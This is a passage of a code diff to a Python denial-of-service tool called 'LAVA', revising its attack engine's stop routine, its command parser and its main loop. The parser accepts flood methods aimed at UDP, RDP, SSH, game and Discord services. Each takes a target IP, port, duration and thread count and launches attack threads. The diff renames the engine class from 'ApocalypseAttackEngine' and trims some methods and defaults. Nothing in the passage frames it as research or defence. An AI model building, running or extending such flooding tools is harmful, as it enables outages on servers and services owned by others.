+                     f"{C.CYAN}Cur:{C.RESET}{cg:>5.2f}Gbps "
+                     f"{C.WHITE}Peak:{C.RESET}{peak:>5.2f}Gbps "
+                     f"{C.BRIGHT_BLACK}Time:{C.RESET}{elapsed:.0f}s   ")
+            print(status, end='', flush=True)
             
             if duration > 0 and elapsed >= duration:
                 break
-    
+
     def stop(self):
         self.active = False
         for p in self.processes:
             try:
                 p.terminate()
                 p.join(timeout=1)
-                if p.is_alive():
-                    p.kill()
             except:
                 pass
         self.processes.clear()
-        print(f"\n{C.BRIGHT_GREEN}[✓] Attack halted. Total packets: {self.stats['packets'].value:,}{C.RESET}")
+        print(f"\n{C.GREEN}[✓] Halted. Total packets: {self.stats['packets'].value:,}{C.RESET}")
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#  COMMAND PARSER
-# ═══════════════════════════════════════════════════════════════════════════════
+engine = AttackEngine()
 
-engine = ApocalypseAttackEngine()
+# ===================================================================
+# COMMAND PARSER
+# ===================================================================
 
-def parse_command(cmd):
+def parse(cmd):
     cmd = cmd.strip().upper()
     parts = cmd.split()
     
@@ -565,87 +340,68 @@ def parse_command(cmd):
         return True
     
     if cmd == '?' or cmd == 'HELP':
-        print_methods_screen()
+        print_methods()
         return True
     
     if cmd == '.CLEAR' or cmd == 'CLEAR':
-        print_main_screen()
+        print_main()
         return True
     
     if cmd == '.STOP' or cmd == 'STOP':
         engine.stop()
-        print_prompt()
         return True
     
     if cmd in ['.EXIT', 'EXIT', '.QUIT', 'QUIT']:
         engine.stop()
-        print(f"\n{C.BRIGHT_MAGENTA}LAVA signing off. Stay dangerous.{C.RESET}\n")
+        print(f"\n{C.MAGENTA}LAVA signing off.{C.RESET}\n")
         return False
     
-    methods = ['U-GBPS', 'U-PPS', 'T-PASS', 'T-BASS', 'S-SUBN', 'S-FIVE', 'S-T53', 
-               'S-JAVA', 'S-DISC', 'S-RDP', 'S-GAME', 'S-SAMP', 'S-SSH',
-               'H-TLS', 'H-EMU']
+    methods = ['U-GBPS', 'U-PPS', 'S-SUBN', 'S-FIVE', 'S-T53', 
+               'S-JAVA', 'S-DISC', 'S-RDP', 'S-GAME', 'S-SAMP', 'S-SSH']
     
     if parts[0] in methods:
         if len(parts) < 4:
-            print(f"{C.BRIGHT_RED}[!] Usage: {parts[0]} <target> <port> <duration> [threads]{C.RESET}")
-            print(f"{C.BRIGHT_YELLOW}[!] Example: U-GBPS 1.2.3.4 0 60 1000{C.RESET}")
-            print_prompt()
+            print(f"{C.RED}[!] Usage: {parts[0]} <IP> <PORT> <DURATION> [THREADS]{C.RESET}")
+            print(f"{C.YELLOW}[!] Example: U-GBPS 1.2.3.4 0 60 500{C.RESET}")
             return True
         
         target = parts[1]
         port = int(parts[2])
         duration = int(parts[3])
-        threads = int(parts[4]) if len(parts) > 4 else 1000
+        threads = int(parts[4]) if len(parts) > 4 else 100
         
         t = threading.Thread(target=engine.launch, args=(parts[0], target, port, duration, threads))
         t.daemon = True
         t.start()
         return True
     
-    print(f"{C.BRIGHT_RED}[!] Unknown command: {cmd}{C.RESET}")
-    print(f"{C.BRIGHT_BLACK}    Type ? for help{C.RESET}")
-    print_prompt()
+    print(f"{C.RED}[!] Unknown: {cmd}{C.RESET}")
     return True
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#  MAIN
-# ═══════════════════════════════════════════════════════════════════════════════
+# ===================================================================
+# MAIN
+# ===================================================================
 
 def main():
-    print_main_screen()
-    
+    print_main()
     while True:
         try:
             cmd = input()
-            if not parse_command(cmd):
+            if not parse(cmd):
                 break
         except KeyboardInterrupt:
-            print(f"\n{C.BRIGHT_YELLOW}[!] Use .exit to quit or .stop to halt attacks{C.RESET}")
-            print_prompt()
+            print(f"\n{C.YELLOW}[!] Use .exit to quit{C.RESET}")
         except EOFError:
             break
 
 if __name__ == '__main__':
-    # Maximum priority
     try:
         os.nice(-20)
     except:
         pass
-    
     try:
         multiprocessing.set_start_method('fork', force=True)
     except:
         pass
-    
-    # Disable garbage collection for speed
     gc.disable()
-    
-    # Increase system limits
-    try:
-        import resource
-        resource.setrlimit(resource.RLIMIT_NPROC, (65535, 65535))
-    except:
-        pass
-    
     main()
